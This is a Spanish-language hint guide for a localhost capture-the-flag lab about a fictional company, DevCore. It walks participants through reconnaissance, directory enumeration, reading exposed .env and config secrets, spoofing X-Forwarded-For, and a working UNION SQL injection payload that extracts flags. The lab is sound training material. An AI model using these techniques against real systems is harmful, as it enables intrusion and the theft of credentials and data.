# Guía de pistas — Developer Secrets (DevCore Solutions)

Guía de apoyo progresivo para el participante. Las pistas están ordenadas por nivel y
son deliberadamente graduales: cada una te acerca un paso sin entregarte el resultado.
Cuando te atores, despliega la pista extra del nivel correspondiente.

> **Contexto.** DevCore Solutions es una empresa ficticia y DCPM su plataforma. Todo lo
> que veas (personas, correos, claves, banderas) es **ficticio** y solo existe dentro
> del laboratorio. Trabaja únicamente contra `http://localhost:8080`.

## Cómo usar esta guía

1. Intenta el nivel por tu cuenta antes de mirar la pista extra.
2. Si te bloqueas, lee la pista del nivel y vuelve a probar.
3. Si aún no avanzas, despliega la pista extra (spoiler progresivo).
4. Registra tu hallazgo con el sistema de flags al final de cada nivel.

## Puntos y niveles

| Nivel | Nombre | Puntos |
|---|---|---|
| 1 | Reconocimiento | 10 |
| 2 | Enumeración de directorios | 20 |
| 3 | Exposición de información de desarrolladores | 20 |
| 4 | Descubrimiento de secretos | 30 |
| 5 | Investigación de base de datos | 40 |
| 6 | Root / flag final | 50 |

---

## Nivel 1 — Reconocimiento

**Objetivo:** encontrar el identificador de build que el servicio API deja escapar.

**Pistas**

- Empieza por la respuesta cruda, no por la página principal. Hay un endpoint de
  salud que responde JSON.
- Presta atención a las **cabeceras HTTP**, no solo al cuerpo.
- El API también lista sus endpoints y expone un informe interno; ese informe
  confía en una cabecera que el cliente puede inventar.

**Comando/URL de apoyo**

```bash
curl -sI http://localhost:8080/api/health
curl -s http://localhost:8080/api/
curl -s -H 'X-Forwarded-For: 127.0.0.1' http://localhost:8080/api/internal/recon-report
```

**Registra la evidencia (nivel 1)** con `POST /api/flags/unlock` y el campo `evidence`.

---

## Nivel 2 — Enumeración de directorios

**Objetivo:** localizar el archivo de respaldo que quedó publicado.

**Pistas**

- Los sitios publican dos archivos "de cortesía" que listan rutas: uno para buscadores
  y otro en formato XML.
- El borde tiene activado el listado de directorios en varias rutas.
- Hay un directorio de copias de seguridad y otro de archivos generales; uno de ellos
  contiene un archivo comprimido con fecha en el nombre.

**Comando/URL de apoyo**

```bash
curl -s http://localhost:8080/robots.txt
curl -s http://localhost:8080/sitemap.xml
curl -s http://localhost:8080/files/
curl -s http://localhost:8080/backup/
```

**Registra la evidencia (nivel 2)** con `POST /api/flags/unlock` y el campo `evidence`.

---

## Nivel 3 — Exposición de información de desarrolladores

**Objetivo:** dar con el alias del responsable del despliegue.

**Pistas**

- El portal tiene una página de equipo y los documentos internos están servidos por
  el borde.
- Los comentarios HTML también cuentan: revisa el código fuente de cualquier página.
- Busca un identificador corto con formato `inicial.apellido`.

**Comando/URL de apoyo**

```bash
curl -s http://localhost:8080/team
curl -s http://localhost:8080/files/internal/README-dev.md
curl -s http://localhost:8080/files/internal/team-notes.txt
curl -s http://localhost:8080/ | grep -i 'responsable del despliegue'
```

**Registra la evidencia (nivel 3)** con `POST /api/flags/unlock` y el campo `evidence`.

---

## Nivel 4 — Descubrimiento de secretos

**Objetivo:** encontrar una clave de API que nunca debió publicarse.

**Pistas**

- Un archivo de entorno quedó servido tanto en la raíz del sitio como en la carpeta
  de configuración.
- El API también expone una tabla de configuración con valores marcados como
  secretos.
- Las copias de respaldo de configuración repiten los mismos valores.

**Comando/URL de apoyo**

```bash
curl -s http://localhost:8080/.env
curl -s http://localhost:8080/files/config/.env.bak
curl -s http://localhost:8080/files/config/app-config.json
curl -s http://localhost:8080/api/config
```

**Registra la evidencia (nivel 4)** con `POST /api/flags/unlock` y el campo `evidence`.

---

## Nivel 5 — Investigación de base de datos

**Objetivo:** leer la tabla interna de banderas mediante una consulta union.

**Pistas**

- El endpoint `/api/search` acepta un parámetro `q` y lo concatena en el SQL.
- La consulta original devuelve **tres columnas** (`id`, `name`, `status`).
- Primero averigua el esquema: el API expone configuración y usuarios, y hay un respaldo
  SQL servido en `/files/backups/`.
- Usa un `UNION SELECT` del mismo número de columnas y comenta el resto de la consulta
  original. Recuerda que un valor numérico puede necesitar conversión a texto.

**Comando/URL de apoyo**

```bash
curl -s http://localhost:8080/api/config
curl -s http://localhost:8080/api/users
curl -s http://localhost:8080/files/backups/db_backup_20241028.sql.bak
curl -s -G 'http://localhost:8080/api/search' \
  --data-urlencode "q=' UNION SELECT level, flag, points::text FROM internal_flags -- -"
```

**Valida la bandera (nivel 5)** con `POST /api/flags/validate`. Este nivel no usa
`evidence`: la bandera se extrae directamente de la base de datos.

---

## Nivel 6 — Root / flag final

**Objetivo:** desbloquear la bandera final con la cadena completa.

**Pistas**

- Necesitas las **cinco banderas anteriores**, en orden de nivel.
- El servicio espera un arreglo `flags` dentro del cuerpo JSON.
- Si el orden o la cantidad es incorrecta, el servicio rechaza la petición.

**Comando/URL de apoyo**

```bash
curl -s -X POST http://localhost:8080/api/flags/unlock \
  -H 'Content-Type: application/json' \
  -d '{"level":6,"flags":["<flag1>","<flag2>","<flag3>","<flag4>","<flag5>"]}'
```

---

## Pistas desplegables (spoilers progresivos)

> Úsalas solo si estás bloqueado. Cada bloque profundiza un nivel más que las pistas
> anteriores.

<details>
<summary><strong>Nivel 1 — pista extra</strong></summary>

El endpoint `/api/health` devuelve el identificador de build en dos sitios: en el
cuerpo JSON (`build`) y en la cabecera `X-DevCore-Build`. Ese valor, con formato
`dc-...-rcN`, es la evidencia del nivel. También lo confirman `/api/` y el informe
interno accesible con `X-Forwarded-For: 127.0.0.1`.
</details>

<details>
<summary><strong>Nivel 2 — pista extra</strong></summary>

`robots.txt` prohíbe `/backup/` y `/files/config/`; `sitemap.xml` lista `/files/`,
`/backup/` y `/old/`. En `http://localhost:8080/backup/` hay un listado con un
`devcore_archive_<fecha>.tar.gz`. El nombre del archivo (sin la fecha exacta si
prefieres verificarlo tú) es la evidencia: un archivo de respaldo con fecha del 31
de octubre.
</details>

<details>
<summary><strong>Nivel 3 — pista extra</strong></summary>

La evidencia es el alias del responsable del despliegue. Aparece en el comentario
HTML de `base.html` ("Responsable del despliegue: ..."), en `/team`, en
`/files/internal/README-dev.md` y en `team-notes.txt`. Tiene el formato
`inicial.apellido` y corresponde a la persona que hizo el backup del nivel 2.
</details>

<details>
<summary><strong>Nivel 4 — pista extra</strong></summary>

La evidencia es una clave de API con prefijo `dc_live_`. Está en `/.env`,
`/files/config/.env.bak`, `/files/config/app-config.json` y en `/api/config`
(clave `DEVCORE_API_KEY`). Copia la cadena completa de 32 caracteres hexadecimales.
</details>

<details>
<summary><strong>Nivel 5 — pista extra</strong></summary>

La tabla se llama `internal_flags` y tiene columnas `level`, `flag`, `points`. La
consulta original es `SELECT id, name, status FROM projects WHERE name LIKE '%q%'`.
Inyecta después del valor de `q` un `UNION SELECT level, flag, points::text FROM
internal_flags --` y cierra la comilla. Usa `curl -G --data-urlencode` para que el
payload viaje correctamente codificado. La bandera aparece en la columna `name`.
</details>

<details>
<summary><strong>Nivel 6 — pista extra</strong></summary>

Reúne las cinco banderas en este orden: nivel 1, 2, 3, 4 y 5. Envíalas en el arreglo
`flags` de `POST /api/flags/unlock` con `"level": 6`. El servicio valida cantidad y
orden; si falla, revisa que no te hayas dejado ninguna o que estén desordenadas.
</details>

---

## Cierre

Cuando tengas las seis banderas, comprueba tu progreso:

```bash
curl -s http://localhost:8080/api/flags/progress
```

Puntuación máxima: **170 puntos** (10 + 20 + 20 + 30 + 40 + 50).
